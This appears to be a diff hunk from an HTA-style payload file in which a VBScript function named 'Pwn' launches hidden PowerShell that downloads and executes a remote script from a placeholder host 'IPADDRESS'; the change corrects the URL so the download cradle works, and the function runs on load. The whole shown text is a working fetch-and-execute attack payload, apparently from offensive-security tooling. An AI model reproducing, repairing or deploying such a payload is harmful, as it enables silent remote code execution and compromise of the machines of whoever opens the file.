@@ -12,7 +12,7 @@
   <script language="VBScript">
     Function Pwn()
       Set shell = CreateObject("wscript.Shell")
-      shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http:/IPADDRESS:80/a'))"""
+      shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://IPADDRESS:80/a'))"""
     End Function
 
     Pwn
